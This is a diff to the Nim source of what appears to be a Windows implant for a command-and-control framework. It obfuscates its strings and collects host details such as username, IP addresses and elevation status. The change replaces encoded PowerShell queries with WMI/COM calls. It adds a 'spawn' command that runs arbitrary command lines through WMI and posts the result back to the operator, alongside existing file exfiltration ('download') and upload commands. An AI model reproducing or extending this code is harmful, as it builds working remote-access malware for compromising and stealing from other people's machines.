@@ -13,9 +13,9 @@ import threadpool
 import nimprotect
 import strformat
 import strutils
-import sequtils
 import osproc
 import crc32
+import net
 import os
 
 # Core functions
@@ -25,6 +25,7 @@ proc windows_parse_command*(command: JsonNode): bool
 # Command executors
 proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
+proc spawn_wmi(cmdline: string): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc enum_visible_windows(): bool
@@ -72,8 +73,11 @@ proc collect_data(): bool =
     var ipv4_public: string
 
     hostname = getHostname()
-    try:
-        os_version = execute_encoded_powershell(protectString("RwBlAHQALQBDAG8AbQBwAHUAdABlAHIASQBuAGYAbwAgAHwAIABzAGUAbABlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAVwBpAG4AZABvAHcAcwBQAHIAbwBkAHUAYwB0AE4AYQBtAGUA"))
+    try:    
+        var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2"))
+        var query = protectString("SELECT * FROM Win32_OperatingSystem")
+        for osInfo in wmi.execQuery(query):
+            os_version = osInfo.Caption.replace(protectString("Microsoft "), "")
     except:
         os_version = could_not_retrieve
     try:
@@ -81,10 +85,8 @@ proc collect_data(): bool =
     except:
         process = could_not_retrieve
     try:
-        var username_c: array[256, TCHAR]
-        var username_c_len: DWORD = 256
-        GetUserName(addr username_c[0], addr username_c_len)
-        username = $username_c.mapIt(it.chr).join().replace("\x00", "")
+        var obj = CreateObject(protectString("WScript.Network"))
+        username = fmt"{obj.userDomain}\{obj.userName}"
     except:
         username = could_not_retrieve
     try:
@@ -96,7 +98,7 @@ proc collect_data(): bool =
     except:
         is_elevated = could_not_retrieve
     try: 
-        ipv4_local = execute_encoded_powershell(protectString("RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAE4AZQB0AHcAbwByAGsAQQBkAGEAcAB0AGUAcgBDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEkAUABBAGQAZAByAGUAcwBzACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAoACQAXwAgAC0AbABpAGsAZQAgACIAMQAwAC4AKgAuACoALgAqACIAKQAgAC0AbwByACAAKAAkAF8AIAAtAGwAaQBrAGUAIAAiADEAOQAyAC4AMQA2ADgALgAqAC4AKgAiACkAIAAtAG8AcgAgACgAJABfACAALQBsAGkAawBlACAAIgAxADcAMgAuADEANgA4AC4AKgAuACoAIgApAH0A"))
+        ipv4_local = $getPrimaryIPAddr()
     except: 
         ipv4_local = could_not_retrieve
     try:
@@ -147,6 +149,20 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
             protectString("output"): "\n" & output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
+
+    return is_success
+
+
+proc spawn_wmi(cmdline: string): bool =
+    var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2:Win32_Process"))
+    var res = wmi.Create(cmdline)
+    var data = {
+        protectString("cmdline"): cmdline,
+        protectString("is_success"): $(res == 0),
+        protectString("result"): $res
+    }.toOrderedTable()
+    
+    var is_success = post_data(client, protectString("spawn") , $data)
 
     return is_success
 
@@ -673,6 +689,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             # ps_modules
             else:
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
+        of protectString("spawn"):
+            is_success = spawn_wmi(command[protectString("cmdline")].getStr())
         of protectString("download"):
             is_success = exfil_file(client, command[protectString("src_file")].getStr())
         of protectString("upload"):
